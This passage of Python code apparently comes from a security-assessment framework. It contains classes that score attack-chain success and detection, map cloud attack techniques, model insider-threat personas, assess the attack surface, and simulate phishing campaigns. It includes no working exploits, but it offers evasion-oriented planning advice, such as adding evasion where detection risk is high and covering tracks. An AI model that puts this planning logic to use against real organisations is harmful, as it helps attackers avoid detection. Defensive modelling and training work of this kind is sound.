        prediction = {
            'success_probability': round(final_prob, 3),
            'detection_probability': round(1 - final_prob * 0.8, 3),
            'confidence': 0.7 if technique in self.model_weights else 0.3,
            'factors': {
                'base_technique_rate': base_prob,
                'stealth_adjustment': (stealth - 5) * 0.02,
                'edr_penalty': -0.15 if attack_step.get('edr_present') else 0
            }
        }
        
        self.prediction_history.append({
            'timestamp': datetime.now().isoformat(),
            'step': attack_step.get('name'),
            'prediction': prediction
        })
        
        return prediction
        
    def predict_chain_success(self, chain: List[Dict]) -> Dict[str, Any]:
        """Predict success probability for entire chain."""
        step_predictions = []
        cumulative_success = 1.0
        cumulative_detection = 0.0
        
        for step in chain:
            pred = self.predict_success(step)
            step_predictions.append(pred)
            cumulative_success *= pred['success_probability']
            cumulative_detection = 1 - (1 - cumulative_detection) * (1 - pred['detection_probability'])
            
        return {
            'chain_success_probability': round(cumulative_success, 4),
            'chain_detection_probability': round(cumulative_detection, 4),
            'step_predictions': step_predictions,
            'weakest_step': min(step_predictions, key=lambda x: x['success_probability']) if step_predictions else None,
            'recommended_improvements': self._suggest_improvements(chain, step_predictions)
        }
        
    def _suggest_improvements(self, chain: List[Dict], predictions: List[Dict]) -> List[str]:
        """Suggest improvements based on predictions."""
        suggestions = []
        
        # Find weak points
        for i, (step, pred) in enumerate(zip(chain, predictions)):
            if pred['success_probability'] < 0.5:
                suggestions.append(f"Step {i+1} ({step.get('name', 'Unknown')}): Consider alternative technique")
                
            if pred['detection_probability'] > 0.7:
                suggestions.append(f"Step {i+1}: High detection risk - add evasion techniques")
                
        # General suggestions
        if len(chain) > 10:
            suggestions.append("Chain is long - consider splitting into phases")
            
        return suggestions
        
    def get_model_stats(self) -> Dict[str, Any]:
        """Get model statistics."""
        return {
            'training_samples': len(self.training_data),
            'techniques_learned': len(self.model_weights),
            'predictions_made': len(self.prediction_history),
            'feature_importance': self.feature_importance,
            'top_techniques': sorted(
                self.model_weights.items(),
                key=lambda x: x[1],
                reverse=True
            )[:10]
        }


# =============================================================================
# CLOUD ATTACK VECTOR MAPPER - Cloud-Specific Attack Paths
# =============================================================================

class CloudAttackVectorMapper:
    """
    Maps attack vectors specific to cloud environments.
    Covers AWS, Azure, GCP, and multi-cloud scenarios.
    """
    
    CLOUD_TECHNIQUES = {
        'aws': {
            'T1078.004': {'name': 'Cloud Accounts', 'risk': 8},
            'iam_privilege_escalation': {'name': 'IAM Privilege Escalation', 'risk': 9},
            's3_bucket_exposure': {'name': 'S3 Bucket Exposure', 'risk': 7},
            'ec2_metadata_abuse': {'name': 'EC2 Metadata Service Abuse', 'risk': 8},
            'lambda_injection': {'name': 'Lambda Function Injection', 'risk': 7},
            'ssm_command_execution': {'name': 'SSM Command Execution', 'risk': 8},
            'secretsmanager_extraction': {'name': 'Secrets Manager Extraction', 'risk': 9},
            'cloudtrail_evasion': {'name': 'CloudTrail Evasion', 'risk': 6},
            'cross_account_pivot': {'name': 'Cross-Account Pivot', 'risk': 9}
        },
        'azure': {
            'T1078.004': {'name': 'Azure AD Accounts', 'risk': 8},
            'managed_identity_abuse': {'name': 'Managed Identity Abuse', 'risk': 8},
            'storage_account_exposure': {'name': 'Storage Account Exposure', 'risk': 7},
            'keyvault_extraction': {'name': 'Key Vault Secret Extraction', 'risk': 9},
            'runbook_execution': {'name': 'Automation Runbook Execution', 'risk': 8},
            'subscription_hijacking': {'name': 'Subscription Hijacking', 'risk': 10},
            'azure_ad_privilege_escalation': {'name': 'Azure AD PrivEsc', 'risk': 9},
            'function_app_injection': {'name': 'Function App Injection', 'risk': 7}
        },
        'gcp': {
            'T1078.004': {'name': 'GCP Service Accounts', 'risk': 8},
            'service_account_key_theft': {'name': 'SA Key Theft', 'risk': 9},
            'gcs_bucket_exposure': {'name': 'GCS Bucket Exposure', 'risk': 7},
            'metadata_service_abuse': {'name': 'Metadata Service Abuse', 'risk': 8},
            'cloud_function_injection': {'name': 'Cloud Function Injection', 'risk': 7},
            'project_takeover': {'name': 'Project Takeover', 'risk': 10},
            'iam_binding_manipulation': {'name': 'IAM Binding Manipulation', 'risk': 9}
        }
    }
    
    def __init__(self):
        self.discovered_resources: Dict[str, List[Dict]] = {}
        self.attack_paths: List[Dict] = []
        self.cloud_posture: Dict[str, Any] = {}
        
    def map_cloud_resources(self, cloud_inventory: Dict) -> Dict[str, Any]:
        """Map cloud resources and identify attack vectors."""
        resource_map = {
            'compute': [],
            'storage': [],
            'identity': [],
            'networking': [],
            'secrets': [],
            'serverless': []
        }
        
        for resource in cloud_inventory.get('resources', []):
            resource_type = resource.get('type', 'unknown')
            
            # Categorize resources
            if resource_type in ['ec2', 'vm', 'gce_instance']:
                resource_map['compute'].append(resource)
            elif resource_type in ['s3', 'blob', 'gcs']:
                resource_map['storage'].append(resource)
            elif resource_type in ['iam_user', 'iam_role', 'service_account', 'managed_identity']:
                resource_map['identity'].append(resource)
            elif resource_type in ['vpc', 'vnet', 'firewall', 'security_group']:
                resource_map['networking'].append(resource)
            elif resource_type in ['secrets_manager', 'keyvault', 'secret_manager']:
                resource_map['secrets'].append(resource)
            elif resource_type in ['lambda', 'function', 'cloud_function']:
                resource_map['serverless'].append(resource)
                
            self.discovered_resources.setdefault(resource_type, []).append(resource)
            
        return resource_map
        
    def identify_attack_paths(self, cloud_provider: str) -> List[Dict]:
        """Identify attack paths for specific cloud provider."""
        techniques = self.CLOUD_TECHNIQUES.get(cloud_provider, {})
        paths = []
        
        for tech_id, tech in techniques.items():
            # Check if relevant resources exist
            relevant = self._check_technique_relevance(tech_id, cloud_provider)
            
            if relevant:
                path = {
                    'technique_id': tech_id,
                    'name': tech.get('name'),
                    'cloud_provider': cloud_provider,
                    'risk_score': tech.get('risk', 5),
                    'affected_resources': relevant,
                    'prerequisites': self._get_cloud_prerequisites(tech_id),
                    'detection_methods': self._get_cloud_detection(tech_id, cloud_provider)
                }
                paths.append(path)
                
        self.attack_paths.extend(paths)
        return sorted(paths, key=lambda x: x['risk_score'], reverse=True)
        
    def _check_technique_relevance(self, technique: str, provider: str) -> List[str]:
        """Check if technique is relevant based on discovered resources."""
        relevant = []
        
        technique_resource_map = {
            's3_bucket_exposure': ['s3'],
            'storage_account_exposure': ['blob'],
            'gcs_bucket_exposure': ['gcs'],
            'ec2_metadata_abuse': ['ec2'],
            'lambda_injection': ['lambda'],
            'function_app_injection': ['function'],
            'cloud_function_injection': ['cloud_function'],
            'iam_privilege_escalation': ['iam_user', 'iam_role'],
            'managed_identity_abuse': ['managed_identity'],
            'service_account_key_theft': ['service_account']
        }
        
        for resource_type in technique_resource_map.get(technique, []):
            if resource_type in self.discovered_resources:
                relevant.extend([r.get('id', r.get('name')) 
                               for r in self.discovered_resources[resource_type]])
                
        return relevant
        
    def _get_cloud_prerequisites(self, technique: str) -> List[str]:
        """Get prerequisites for cloud technique."""
        prereqs = {
            's3_bucket_exposure': ['s3:ListBucket', 's3:GetObject'],
            'iam_privilege_escalation': ['iam:CreateRole', 'iam:AttachRolePolicy'],
            'ec2_metadata_abuse': ['ec2_access', 'imds_enabled'],
            'lambda_injection': ['lambda:UpdateFunctionCode'],
            'managed_identity_abuse': ['vm_access', 'managed_identity_assigned'],
            'keyvault_extraction': ['keyvault_access', 'get_secret_permission'],
            'service_account_key_theft': ['iam.serviceAccountKeys.create']
        }
        return prereqs.get(technique, ['cloud_access'])
        
    def _get_cloud_detection(self, technique: str, provider: str) -> List[str]:
        """Get detection methods for cloud technique."""
        detection = {
            'aws': {
                's3_bucket_exposure': ['CloudTrail S3 data events', 'S3 access logs'],
                'iam_privilege_escalation': ['CloudTrail IAM events', 'GuardDuty'],
                'ec2_metadata_abuse': ['VPC flow logs', 'CloudWatch'],
                'lambda_injection': ['CloudTrail Lambda events']
            },
            'azure': {
                'managed_identity_abuse': ['Azure Activity Log', 'Azure Sentinel'],
                'keyvault_extraction': ['Key Vault diagnostic logs'],
                'azure_ad_privilege_escalation': ['Azure AD audit logs']
            },
            'gcp': {
                'service_account_key_theft': ['Cloud Audit Logs', 'Security Command Center'],
                'gcs_bucket_exposure': ['Cloud Audit Logs', 'VPC Service Controls']
            }
        }
        
        return detection.get(provider, {}).get(technique, ['Cloud logging'])
        
    def assess_cloud_posture(self) -> Dict[str, Any]:
        """Assess overall cloud security posture."""
        posture = {
            'total_resources': sum(len(r) for r in self.discovered_resources.values()),
            'attack_paths_identified': len(self.attack_paths),
            'high_risk_paths': sum(1 for p in self.attack_paths if p.get('risk_score', 0) >= 8),
            'risk_by_category': {},
            'recommendations': []
        }
        
        # Calculate risk by resource category
        for path in self.attack_paths:
            tech = path.get('technique_id', 'unknown')
            category = self._categorize_technique(tech)
            if category not in posture['risk_by_category']:
                posture['risk_by_category'][category] = 0
            posture['risk_by_category'][category] += path.get('risk_score', 0)
            
        # Generate recommendations
        if posture['high_risk_paths'] > 3:
            posture['recommendations'].append("üî¥ Multiple high-risk paths - prioritize remediation")
            
        if 'iam_privilege_escalation' in [p.get('technique_id') for p in self.attack_paths]:
            posture['recommendations'].append("üîê Review IAM policies for least privilege")
            
        if any('metadata' in p.get('technique_id', '') for p in self.attack_paths):
            posture['recommendations'].append("üì° Implement IMDSv2 for metadata service protection")
            
        self.cloud_posture = posture
        return posture
        
    def _categorize_technique(self, technique: str) -> str:
        """Categorize technique by type."""
        if 'iam' in technique or 'identity' in technique or 'account' in technique:
            return 'identity'
        elif 'storage' in technique or 's3' in technique or 'bucket' in technique:
            return 'storage'
        elif 'metadata' in technique or 'ec2' in technique or 'vm' in technique:
            return 'compute'
        elif 'secret' in technique or 'keyvault' in technique:
            return 'secrets'
        else:
            return 'other'


# =============================================================================
# INSIDER THREAT MODELER - Insider Attack Simulation
# =============================================================================

class InsiderThreatModeler:
    """
    Models and simulates insider threat scenarios.
    Analyzes access patterns and identifies insider attack vectors.
    """
    
    INSIDER_PERSONAS = {
        'disgruntled_employee': {
            'motivation': 'revenge',
            'access_level': 'normal',
            'technical_skill': 'medium',
            'detection_awareness': 'medium',
            'typical_actions': ['data_theft', 'sabotage', 'credential_sharing']
        },
        'financial_motivated': {
            'motivation': 'money',
            'access_level': 'normal',
            'technical_skill': 'low',
            'detection_awareness': 'low',
            'typical_actions': ['data_theft', 'fraud', 'selling_access']
        },
        'compromised_insider': {
            'motivation': 'external_pressure',
            'access_level': 'varies',
            'technical_skill': 'varies',
            'detection_awareness': 'high',
            'typical_actions': ['credential_theft', 'backdoor_installation', 'lateral_movement']
        },
        'privileged_admin': {
            'motivation': 'varies',
            'access_level': 'high',
            'technical_skill': 'high',
            'detection_awareness': 'high',
            'typical_actions': ['data_exfiltration', 'log_tampering', 'persistent_access']
        },
        'departing_employee': {
            'motivation': 'opportunity',
            'access_level': 'normal',
            'technical_skill': 'medium',
            'detection_awareness': 'medium',
            'typical_actions': ['data_theft', 'credential_retention']
        }
    }
    
    def __init__(self):
        self.threat_scenarios: List[Dict] = []
        self.access_analysis: Dict[str, Any] = {}
        self.detection_gaps: List[str] = []
        
    def model_insider_scenario(self, persona: str, target_data: List[str]) -> Dict[str, Any]:
        """Model an insider threat scenario."""
        persona_info = self.INSIDER_PERSONAS.get(persona, {})
        
        scenario = {
            'id': f"insider_{int(time.time())}",
            'persona': persona,
            'persona_details': persona_info,
            'target_data': target_data,
            'attack_phases': self._generate_attack_phases(persona_info, target_data),
            'detection_opportunities': self._identify_detection_opportunities(persona_info),
            'risk_score': self._calculate_insider_risk(persona_info, target_data),
            'mitigation_recommendations': self._generate_mitigations(persona)
        }
        
        self.threat_scenarios.append(scenario)
        return scenario
        
    def _generate_attack_phases(self, persona: Dict, targets: List[str]) -> List[Dict]:
        """Generate attack phases for insider scenario."""
        phases = []
        
        # Phase 1: Reconnaissance (all insiders)
        phases.append({
            'phase': 1,
            'name': 'Internal Reconnaissance',
            'activities': [
                'Identify valuable data locations',
                'Map access permissions',
                'Identify monitoring blind spots'
            ],
            'duration_days': 7
        })
        
        # Phase 2: Access Expansion (if needed)
        if persona.get('access_level') != 'high':
            phases.append({
                'phase': 2,
                'name': 'Access Expansion',
                'activities': [
                    'Request additional permissions',
                    'Shoulder surf credentials',
                    'Exploit shared accounts'
                ],
                'duration_days': 14
            })
            
        # Phase 3: Data Collection
        phases.append({
            'phase': 3,
            'name': 'Data Collection',
            'activities': [
                'Aggregate target data',
                'Copy to personal storage',
                'Stage for exfiltration'
            ],
            'duration_days': 7
        })
        
        # Phase 4: Exfiltration
        phases.append({
            'phase': 4,
            'name': 'Exfiltration',
            'activities': [
                'Transfer data externally',
                'Cover tracks',
                'Remove evidence'
            ],
            'duration_days': 3
        })
        
        return phases
        
    def _identify_detection_opportunities(self, persona: Dict) -> List[Dict]:
        """Identify opportunities to detect insider threat."""
        opportunities = []
        
        # Universal detection points
        opportunities.extend([
            {
                'point': 'Unusual data access patterns',
                'method': 'UEBA',
                'effectiveness': 7
            },
            {
                'point': 'Large data transfers',
                'method': 'DLP',
                'effectiveness': 8
            },
            {
                'point': 'Off-hours activity',
                'method': 'Access logging',
                'effectiveness': 6
            }
        ])
        
        # Persona-specific detections
        if persona.get('technical_skill') == 'high':
            opportunities.append({
                'point': 'Security tool tampering',
                'method': 'Integrity monitoring',
                'effectiveness': 5
            })
            
        if persona.get('access_level') == 'high':
            opportunities.append({
                'point': 'Privileged command usage',
                'method': 'Privileged access monitoring',
                'effectiveness': 7
            })
            
        return opportunities
        
    def _calculate_insider_risk(self, persona: Dict, targets: List[str]) -> int:
        """Calculate insider threat risk score."""
        risk = 5  # Base risk
        
        # Access level impact
        access = persona.get('access_level', 'normal')
        if access == 'high':
            risk += 3
        elif access == 'normal':
            risk += 1
            
        # Technical skill impact
        skill = persona.get('technical_skill', 'medium')
        if skill == 'high':
            risk += 2
        elif skill == 'medium':
            risk += 1
            
        # Detection awareness impact
        awareness = persona.get('detection_awareness', 'medium')
        if awareness == 'high':
            risk += 1
            
        # Target sensitivity
        if any(t in ['pii', 'financial', 'trade_secret'] for t in targets):
            risk += 2
            
        return min(10, risk)
        
    def _generate_mitigations(self, persona: str) -> List[str]:
        """Generate mitigation recommendations."""
        mitigations = [
            "Implement User and Entity Behavior Analytics (UEBA)",
            "Deploy Data Loss Prevention (DLP) solution",
            "Enable comprehensive access logging"
        ]
        
        persona_specific = {
            'disgruntled_employee': [
                "Monitor employees under performance improvement",
                "Implement exit interview process",
                "Review access during termination"
            ],
            'privileged_admin': [
                "Implement privileged access management (PAM)",
                "Require multi-person authorization for sensitive actions",
                "Record privileged sessions"
            ],
            'departing_employee': [
                "Immediate access revocation on notice",
                "Monitor data access during notice period",
                "Audit recent file access before departure"
            ]
        }
        
        mitigations.extend(persona_specific.get(persona, []))
        return mitigations
        
    def analyze_access_patterns(self, access_logs: List[Dict]) -> Dict[str, Any]:
        """Analyze access patterns for insider threat indicators."""
        analysis = {
            'total_accesses': len(access_logs),
            'anomalies_detected': [],
            'risk_indicators': [],
            'users_flagged': []
        }
        
        # Group by user
        user_accesses = {}
        for log in access_logs:
            user = log.get('user', 'unknown')
            if user not in user_accesses:
                user_accesses[user] = []
            user_accesses[user].append(log)
            
        # Analyze each user
        for user, accesses in user_accesses.items():
            # Check for anomalies
            anomalies = self._detect_anomalies(user, accesses)
            if anomalies:
                analysis['anomalies_detected'].extend(anomalies)
                analysis['users_flagged'].append({
                    'user': user,
                    'anomaly_count': len(anomalies),
                    'risk_level': 'high' if len(anomalies) >= 3 else 'medium'
                })
                
        self.access_analysis = analysis
        return analysis
        
    def _detect_anomalies(self, user: str, accesses: List[Dict]) -> List[Dict]:
        """Detect anomalies in user access patterns."""
        anomalies = []
        
        # Check for off-hours access (simplified)
        for access in accesses:
            hour = access.get('hour', 12)
            if hour < 6 or hour > 22:
                anomalies.append({
                    'type': 'off_hours_access',
                    'user': user,
                    'details': f"Access at hour {hour}"
                })
                
        # Check for bulk downloads
        download_count = sum(1 for a in accesses if a.get('action') == 'download')
        if download_count > 50:
            anomalies.append({
                'type': 'bulk_download',
                'user': user,
                'details': f"{download_count} downloads detected"
            })
            
        return anomalies


# =============================================================================
# ATTACK SURFACE MAPPER - Comprehensive Attack Surface Analysis
# =============================================================================

class AttackSurfaceMapper:
    """
    Comprehensive attack surface mapping and analysis.
    Identifies all potential entry points and attack vectors.
    """
    
    ATTACK_SURFACE_CATEGORIES = {
        'network': {
            'components': ['firewalls', 'vpn', 'load_balancers', 'dns', 'routers'],
            'risk_factors': ['open_ports', 'misconfigurations', 'outdated_firmware']
        },
        'web_applications': {
            'components': ['websites', 'apis', 'web_services', 'portals'],
            'risk_factors': ['vulnerabilities', 'misconfigurations', 'weak_auth']
        },
        'identity': {
            'components': ['ad', 'ldap', 'sso', 'mfa', 'service_accounts'],
            'risk_factors': ['weak_passwords', 'excessive_permissions', 'stale_accounts']
        },
        'endpoints': {
            'components': ['workstations', 'laptops', 'mobile', 'servers'],
            'risk_factors': ['unpatched', 'unauthorized_software', 'weak_controls']
        },
        'cloud': {
            'components': ['iaas', 'paas', 'saas', 'containers', 'serverless'],
            'risk_factors': ['misconfigurations', 'excessive_permissions', 'public_exposure']
        },
        'supply_chain': {
            'components': ['vendors', 'third_party_software', 'contractors'],
            'risk_factors': ['vendor_access', 'unvetted_software', 'dependency_risks']
        },
        'physical': {
            'components': ['offices', 'data_centers', 'remote_sites'],
            'risk_factors': ['access_control', 'visitor_management', 'surveillance']
        },
        'human': {
            'components': ['employees', 'contractors', 'executives'],
            'risk_factors': ['phishing_susceptibility', 'security_awareness', 'social_engineering']
        }
    }
    
    def __init__(self):
        self.discovered_surface: Dict[str, List[Dict]] = {}
        self.risk_scores: Dict[str, float] = {}
        self.exposure_metrics: Dict[str, Any] = {}
        
    def map_attack_surface(self, inventory: Dict) -> Dict[str, Any]:
        """Map complete attack surface."""
        surface_map = {
            'categories': {},
            'total_assets': 0,
            'total_risk_score': 0,
            'critical_exposures': []
        }
        
        for category, config in self.ATTACK_SURFACE_CATEGORIES.items():
            category_assets = []
            
            for component_type in config.get('components', []):
                assets = inventory.get(component_type, [])
                for asset in assets:
                    asset_info = {
                        'id': asset.get('id', str(uuid.uuid4())[:8]),
                        'name': asset.get('name', 'Unknown'),
                        'type': component_type,
                        'category': category,
                        'exposure_level': self._calculate_exposure(asset),
                        'risk_factors': self._identify_risk_factors(asset, config.get('risk_factors', []))
                    }
                    category_assets.append(asset_info)
                    surface_map['total_assets'] += 1
                    
            surface_map['categories'][category] = {
                'assets': category_assets,
                'count': len(category_assets),
                'avg_exposure': sum(a['exposure_level'] for a in category_assets) / max(1, len(category_assets))
            }
            
            self.discovered_surface[category] = category_assets
            
        # Calculate total risk
        surface_map['total_risk_score'] = self._calculate_total_risk()
        
        # Identify critical exposures
        surface_map['critical_exposures'] = self._identify_critical_exposures()
        
        return surface_map
        
    def _calculate_exposure(self, asset: Dict) -> int:
        """Calculate exposure level for asset (1-10)."""
        exposure = 5  # Base
        
        # Internet facing increases exposure
        if asset.get('internet_facing'):
            exposure += 3
            
        # Authentication reduces exposure
        if asset.get('requires_auth'):
            exposure -= 1
            
        # Encryption reduces exposure
        if asset.get('encrypted'):
            exposure -= 1
            
        # Unpatched increases exposure
        if asset.get('unpatched'):
            exposure += 2
            
        return max(1, min(10, exposure))
        
    def _identify_risk_factors(self, asset: Dict, potential_factors: List[str]) -> List[str]:
        """Identify risk factors present for asset."""
        present_factors = []
        
        for factor in potential_factors:
            if asset.get(factor):
                present_factors.append(factor)
            elif factor == 'open_ports' and asset.get('ports', []):
                present_factors.append(factor)
            elif factor == 'outdated_firmware' and asset.get('firmware_age_days', 0) > 365:
                present_factors.append(factor)
                
        return present_factors
        
    def _calculate_total_risk(self) -> float:
        """Calculate total risk score across attack surface."""
        total = 0
        weights = {
            'network': 1.5,
            'web_applications': 1.5,
            'identity': 2.0,
            'endpoints': 1.0,
            'cloud': 1.5,
            'supply_chain': 1.2,
            'physical': 0.8,
            'human': 1.3
        }
        
        for category, assets in self.discovered_surface.items():
            weight = weights.get(category, 1.0)
            for asset in assets:
                total += asset.get('exposure_level', 5) * weight
                
        return round(total, 2)
        
    def _identify_critical_exposures(self) -> List[Dict]:
        """Identify critical exposures across attack surface."""
        critical = []
        
        for category, assets in self.discovered_surface.items():
            for asset in assets:
                if asset.get('exposure_level', 0) >= 8:
                    critical.append({
                        'asset': asset.get('name'),
                        'category': category,
                        'exposure': asset.get('exposure_level'),
                        'risk_factors': asset.get('risk_factors', [])
                    })
                    
        return sorted(critical, key=lambda x: x['exposure'], reverse=True)
        
    def calculate_exposure_metrics(self) -> Dict[str, Any]:
        """Calculate exposure metrics."""
        metrics = {
            'total_assets': sum(len(a) for a in self.discovered_surface.values()),
            'internet_facing': 0,
            'high_exposure': 0,
            'by_category': {},
            'risk_distribution': {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
        }
        
        for category, assets in self.discovered_surface.items():
            category_metrics = {
                'count': len(assets),
                'avg_exposure': 0,
                'internet_facing': 0
            }
            
            exposure_sum = 0
            for asset in assets:
                exposure = asset.get('exposure_level', 5)
                exposure_sum += exposure
                
                if exposure >= 8:
                    metrics['high_exposure'] += 1
                    metrics['risk_distribution']['critical'] += 1
                elif exposure >= 6:
                    metrics['risk_distribution']['high'] += 1
                elif exposure >= 4:
                    metrics['risk_distribution']['medium'] += 1
                else:
                    metrics['risk_distribution']['low'] += 1
                    
            category_metrics['avg_exposure'] = exposure_sum / max(1, len(assets))
            metrics['by_category'][category] = category_metrics
            
        self.exposure_metrics = metrics
        return metrics
        
    def generate_surface_reduction_plan(self) -> List[Dict]:
        """Generate attack surface reduction plan."""
        plan = []
        
        # Prioritize by exposure
        all_assets = []
        for category, assets in self.discovered_surface.items():
            for asset in assets:
                all_assets.append({**asset, 'category': category})
                
        all_assets.sort(key=lambda x: x.get('exposure_level', 0), reverse=True)
        
        for asset in all_assets[:20]:  # Top 20 highest exposure
            reduction_actions = self._suggest_reduction_actions(asset)
            if reduction_actions:
                plan.append({
                    'asset': asset.get('name'),
                    'category': asset.get('category'),
                    'current_exposure': asset.get('exposure_level'),
                    'actions': reduction_actions,
                    'estimated_reduction': sum(a.get('reduction', 1) for a in reduction_actions)
                })
                
        return plan
        
    def _suggest_reduction_actions(self, asset: Dict) -> List[Dict]:
        """Suggest actions to reduce attack surface for asset."""
        actions = []
        
        risk_factors = asset.get('risk_factors', [])
        
        if 'open_ports' in risk_factors:
            actions.append({
                'action': 'Close unnecessary ports',
                'reduction': 2,
                'priority': 'high'
            })
            
        if 'misconfigurations' in risk_factors:
            actions.append({
                'action': 'Review and fix configurations',
                'reduction': 2,
                'priority': 'high'
            })
            
        if 'weak_auth' in risk_factors:
            actions.append({
                'action': 'Implement strong authentication',
                'reduction': 2,
                'priority': 'critical'
            })
            
        if 'unpatched' in risk_factors:
            actions.append({
                'action': 'Apply security patches',
                'reduction': 3,
                'priority': 'critical'
            })
            
        if asset.get('exposure_level', 0) >= 7:
            actions.append({
                'action': 'Consider removing from internet exposure',
                'reduction': 3,
                'priority': 'high'
            })
            
        return actions


# =============================================================================
# PHISHING CAMPAIGN SIMULATOR - Social Engineering Simulation
# =============================================================================

class PhishingCampaignSimulator:
    """
    Simulates phishing and social engineering campaigns.
    Tracks success rates and identifies vulnerable users.
    """
    
    CAMPAIGN_TYPES = {
        'credential_harvest': {
            'description': 'Capture credentials via fake login page',
            'sophistication': 'medium',
            'success_rate_base': 0.15
        },
        'malware_delivery': {
            'description': 'Deliver malware via attachment or link',
            'sophistication': 'high',
            'success_rate_base': 0.08
        },
        'business_email_compromise': {
            'description': 'Impersonate executive for wire transfer',
            'sophistication': 'high',
            'success_rate_base': 0.05
        },
        'spear_phishing': {
            'description': 'Targeted attack with personalization',
            'sophistication': 'high',
            'success_rate_base': 0.25
        },
        'whaling': {
            'description': 'Target high-value executives',
            'sophistication': 'very_high',
            'success_rate_base': 0.20
        },
        'smishing': {
            'description': 'SMS-based phishing',
            'sophistication': 'medium',
            'success_rate_base': 0.12
        },
        'vishing': {
            'description': 'Voice-based social engineering',
            'sophistication': 'high',
            'success_rate_base': 0.18
        }
    }
    
    def __init__(self):
        self.campaigns: Dict[str, Dict] = {}
        self.results: Dict[str, Dict] = {}
        self.vulnerable_users: List[Dict] = []
        
    def create_campaign(self, campaign_id: str, config: Dict) -> Dict:
        """Create a phishing campaign."""
        campaign_type = config.get('type', 'credential_harvest')
        type_info = self.CAMPAIGN_TYPES.get(campaign_type, {})
        
        campaign = {
            'id': campaign_id,
            'name': config.get('name', 'Unnamed Campaign'),
            'type': campaign_type,
            'type_info': type_info,
            'targets': config.get('targets', []),
            'template': config.get('template', 'default'),
            'sender': config.get('sender', {}),
            'landing_page': config.get('landing_page'),
            'tracking': config.get('tracking', True),
            'status': 'created',
            'created_at': datetime.now().isoformat(),
            'launched_at': None,
            'completed_at': None
        }
        
        self.campaigns[campaign_id] = campaign
        return campaign
        
    def simulate_campaign(self, campaign_id: str) -> Dict[str, Any]:
        """Simulate campaign execution."""
        campaign = self.campaigns.get(campaign_id)
        if not campaign:
            return {'error': 'Campaign not found'}
            
        campaign['status'] = 'running'
        campaign['launched_at'] = datetime.now().isoformat()
        
        type_info = campaign.get('type_info', {})
        base_rate = type_info.get('success_rate_base', 0.1)
        
        results = {
            'campaign_id': campaign_id,
            'emails_sent': len(campaign.get('targets', [])),
            'emails_opened': 0,
            'links_clicked': 0,
            'credentials_captured': 0,
            'data_submitted': 0,
            'reported': 0,
            'user_results': []
        }
        
        for target in campaign.get('targets', []):
            # Simulate user behavior
            user_result = self._simulate_user_response(target, base_rate)
            results['user_results'].append(user_result)
            
            # Aggregate results
            if user_result.get('opened'):
                results['emails_opened'] += 1
            if user_result.get('clicked'):
                results['links_clicked'] += 1
            if user_result.get('submitted_creds'):
                results['credentials_captured'] += 1
            if user_result.get('reported'):
                results['reported'] += 1
                
        # Calculate rates
        total = max(1, results['emails_sent'])
        results['open_rate'] = round(results['emails_opened'] / total * 100, 1)
        results['click_rate'] = round(results['links_clicked'] / total * 100, 1)
        results['submit_rate'] = round(results['credentials_captured'] / total * 100, 1)
        results['report_rate'] = round(results['reported'] / total * 100, 1)
        
        campaign['status'] = 'completed'
        campaign['completed_at'] = datetime.now().isoformat()
        
        self.results[campaign_id] = results
        self._identify_vulnerable_users(results)
        
        return results
        
    def _simulate_user_response(self, target: Dict, base_rate: float) -> Dict:
        """Simulate individual user response."""
        # Adjust rate based on user profile
        adjusted_rate = base_rate
        
        # Department affects susceptibility
        department = target.get('department', '').lower()
        if department in ['sales', 'marketing', 'hr']:
            adjusted_rate *= 1.3
        elif department in ['it', 'security']:
            adjusted_rate *= 0.5
            
        # Training reduces susceptibility
        if target.get('security_training_recent'):
            adjusted_rate *= 0.6
            
        # Seniority affects susceptibility
        if target.get('seniority') == 'executive':
            adjusted_rate *= 0.8  # More cautious
        elif target.get('seniority') == 'entry':
            adjusted_rate *= 1.2  # Less experienced
            
        result = {
            'user_id': target.get('id'),
            'email': target.get('email'),
            'department': department,
            'opened': random.random() < min(0.8, adjusted_rate * 3),
            'clicked': False,
            'submitted_creds': False,
            'reported': False
        }
        
        if result['opened']:
            result['clicked'] = random.random() < adjusted_rate * 2
            
        if result['clicked']:
            result['submitted_creds'] = random.random() < adjusted_rate
            
        # Some users report
        result['reported'] = random.random() < 0.1 and target.get('security_training_recent')
        
        return result
        
    def _identify_vulnerable_users(self, results: Dict):
        """Identify vulnerable users from campaign results."""
        for user_result in results.get('user_results', []):
            if user_result.get('submitted_creds'):
                self.vulnerable_users.append({
                    'user_id': user_result.get('user_id'),
                    'email': user_result.get('email'),
                    'department': user_result.get('department'),
                    'risk_level': 'high',
                    'campaign_id': results.get('campaign_id'),
                    'recommendation': 'Mandatory security awareness training'
                })
            elif user_result.get('clicked'):
                self.vulnerable_users.append({
                    'user_id': user_result.get('user_id'),
                    'email': user_result.get('email'),
                    'department': user_result.get('department'),
                    'risk_level': 'medium',
                    'campaign_id': results.get('campaign_id'),
                    'recommendation': 'Additional phishing awareness training'
                })
                
    def generate_campaign_report(self, campaign_id: str) -> str:
        """Generate campaign report."""
        results = self.results.get(campaign_id)
        if not results:
            return "No results found for campaign"
            
        campaign = self.campaigns.get(campaign_id, {})
        
        report = f"""
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                    PHISHING CAMPAIGN REPORT                       ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù

üìß CAMPAIGN: {campaign.get('name', 'Unknown')}
   Type: {campaign.get('type', 'Unknown')}
